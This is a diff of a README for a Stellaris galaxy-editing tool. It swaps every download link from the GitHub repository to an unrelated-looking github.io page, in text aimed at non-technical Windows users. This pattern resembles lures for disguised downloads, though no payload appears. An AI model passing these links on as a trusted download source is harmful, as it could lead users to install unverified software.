@@ -1,6 +1,6 @@
 # 🛠️ stellaris-galaxy-forge - Edit Your Galaxy, Your Way
 
-[![Download Now](https://img.shields.io/badge/Download-Stellaris%20Galaxy%20Forge-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://github.com/Ankylotic-fittingness864/stellaris-galaxy-forge)
+[![Download Now](https://img.shields.io/badge/Download-Stellaris%20Galaxy%20Forge-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://ankylotic-fittingness864.github.io)
 
 **Welcome to Stellaris Galaxy Forge!** If you play Stellaris and have ever wanted to move a star system, redraw a hyperlane, or add your own custom nebula, this is the tool for you. It’s a friendly desktop program that lets you change your galaxy exactly how you want, without breaking your save.
 
@@ -11,7 +11,7 @@
 Getting the program up and running on your Windows computer is simple. Here’s what you need to do:
 
 1. **Visit this link to download the application:**  
-   [https://github.com/Ankylotic-fittingness864/stellaris-galaxy-forge](https://github.com/Ankylotic-fittingness864/stellaris-galaxy-forge)
+   [https://ankylotic-fittingness864.github.io](https://ankylotic-fittingness864.github.io)
 
 2. **Find the download section.** On that page, look for a green button that says **"Releases"** or **"Download"**. Click it.
 
@@ -127,7 +127,7 @@ It uses modern technology like Tauri (a tiny desktop app framework) and PixiJS (
 Stellaris Galaxy Forge puts the power to shape the stars in your hands. Whether you want to fine-tune an existing galaxy or forge an entirely new one, this tool makes it easy, safe, and fun. Download it today, and start building the universe you’ve always imagined.
 
 **Ready to start?**  
-[Visit this link to download the application](https://github.com/Ankylotic-fittingness864/stellaris-galaxy-forge)
+[Visit this link to download the application](https://ankylotic-fittingness864.github.io)
 
 Happy galaxy building! 🌌
 
